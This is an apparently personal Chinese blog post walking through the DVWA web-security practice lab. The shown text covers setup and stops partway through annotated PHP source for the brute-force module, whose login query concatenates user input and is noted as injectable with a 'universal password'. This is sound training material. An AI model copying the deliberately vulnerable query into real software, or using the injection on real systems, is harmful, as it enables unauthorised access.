<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>DVWA靶场通关 - Jay的个人博客</title>
    <meta charset="UTF-8">
    <meta name="description" content="记录分享学习">
    <meta name="keywords" content="记录,学习,分享">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="/assets/logoko.png" type="image/png" />
    <meta name="description" content="DVWA靶场简介DVWA（Damn Vulnerable Web Application）和pikachu一样是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。它一共包含了十个模块：brute force(暴力破解)、command inject(命令行注入)、CSRF(跨站">
<meta property="og:type" content="article">
<meta property="og:title" content="DVWA靶场通关">
<meta property="og:url" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/index.html">
<meta property="og:site_name" content="Jay的个人博客">
<meta property="og:description" content="DVWA靶场简介DVWA（Damn Vulnerable Web Application）和pikachu一样是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。它一共包含了十个模块：brute force(暴力破解)、command inject(命令行注入)、CSRF(跨站">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-11-57-53.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-43-54.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-12-14-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-02.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-13-45-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-37-49.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-44-12.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-23-45.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-29-16.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-49.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-10-50-10.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-11-50-15.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-01-11.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-10-51.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-18-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-12-29-59.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-31-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-14-37-45.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-15-22-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-10-52-59.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-15-13.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-26-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-12-06-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-49-15.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-50-00.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-57-05.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-07-51.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-21-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-18-08-12.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-30-50.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-19-08-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-46-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-49-37.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-54-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-08-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-19-41.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-12-52-36.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-25-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-38-59.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-41-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-44-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-48-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-23-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-21-53.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-26-14.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-27-51.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-14-02.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-16-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-21-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-22-01.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-25-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-40-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-43-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-48-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-51-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-55-46.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-14-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-16-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-20-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-24-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-27-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-59-30.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-55-06.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-58-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-08-15.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-09-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-22-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-47-36.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-51-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-56-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-01-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-42-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-48-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-49-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-29-32.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-52-30.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-53-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-57-45.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-54-45.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-20-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-27-39.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-33-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-34-41.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-53-50.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-17-02-30.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-05-19.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-14-36.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-20-48.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-11-25-21.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-36-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-37-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-44-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-58-59.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-29-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-34-30.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-55-14.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-15-57-02.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-19-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-28-44.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-02-31.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-16-49-07.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-02-34.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-42-18.png">
<meta property="article:published_time" content="2023-03-15T03:17:20.000Z">
<meta property="article:modified_time" content="2023-03-21T10:24:09.919Z">
<meta property="article:author" content="Jay jay">
<meta property="article:tag" content="学习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-11-57-53.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1681885929766">
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681885929766">
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(/assets/background.gif)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="Jay jay" class="mdui-btn mdui-btn-icon"><img src="/assets/avatar.jpg" alt="Jay jay"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Jay jay">
            <img src="/assets/avatar.jpg" alt="Jay jay" alt="Jay jay">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>28</div>
        <div><span>标签</span>2</div>
        <div><span>分类</span>0</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://www.baidu.com/s?wd=" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/436182677" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/yyj-xx/yyj-xx.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">学习</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E5%86%99%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">学习写博客</a>
    </div>
    
  </div>

    
    

    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2023 Jay jay
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        <br>人生需要不断的探索
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
      
          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
              <img data-src="/assets/background.gif" data-sizes="auto" alt="DVWA靶场通关" class="lazyload">
              <h1>DVWA靶场通关</h1>
          </div>
      
      
      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月15日</a>
    <a><i class="nexmoefont icon-areachart"></i>21.5k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 112 分钟</a>
</div>

      

      <h2 id="DVWA靶场简介"><a href="#DVWA靶场简介" class="headerlink" title="DVWA靶场简介"></a>DVWA靶场简介</h2><p>DVWA（Damn Vulnerable Web Application）和pikachu一样是一个用来进行安全脆弱性鉴定的PHP/MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。它一共包含了十个模块：brute force(暴力破解)、command inject(命令行注入)、CSRF(跨站请求伪造)、File inclusion(文件包含)、file Upload(文件上传)、insecure Captcha(不安全的验证码)、SQL Inject(sql注入)、XSS(跨站脚本攻击)。包含了OWASP TOP 10所有攻击漏洞练习环境，供大家学习。<br>DVWA还可以手动调整安全级别(low、medium、high、impossible)级别越高防护越严格，渗透难度越大。</p>
<h2 id="DVWA安装"><a href="#DVWA安装" class="headerlink" title="DVWA安装"></a>DVWA安装</h2><p>和pikachu靶场一样将<a target="_blank" rel="noopener" href="https://github.com/ethicalhack3r/DVWA/archive/master.zip">DWAV的源码</a>解压到phpstudy的www目录下,修改配置文件,启动phpstudy然后在浏览器访问网站进行安装<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-11-57-53.png" alt="安装流程" class="lazyload"><br>安装完成我们就可以进行测试学习了，如果英文不是很强可以借助浏览器翻译来进行学习<br>如果安装完成不用登录就可以访问内容我们可以这样操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-43-54.png" alt="加登录" class="lazyload"></p>
<h2 id="DVWA-–-暴力破解（Brute-Force）"><a href="#DVWA-–-暴力破解（Brute-Force）" class="headerlink" title="DVWA – 暴力破解（Brute Force）"></a>DVWA – 暴力破解（Brute Force）</h2><p>暴力破解：指的是用字典通过穷举法猜测用户口令：<br><strong>low难度下的暴力破解：</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-12-14-57.png" alt="靶场显示" class="lazyload"><br>源码解析：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-02.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//检查变量是否设置，查看有无Login参数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// 获取用户名</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br><br> <span class="hljs-comment">// 获取密码</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-comment">// 将密码使用md5加密</span><br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// 构造sql语句，这里并没有做处理 可以直接用万能密码手工注入进行登录</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-comment">//查询的sql语句并把结果保存在result中 查到了，保存用户具体信息 未查到，就在页面上输入错误结果，result为空</span><br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-comment">//结果存在且数量为1说明查到了</span><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// 获取关联数据row row是键值对</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-comment">//获取登录成功的图片</span><br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// 登录成功，输出到页面</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span 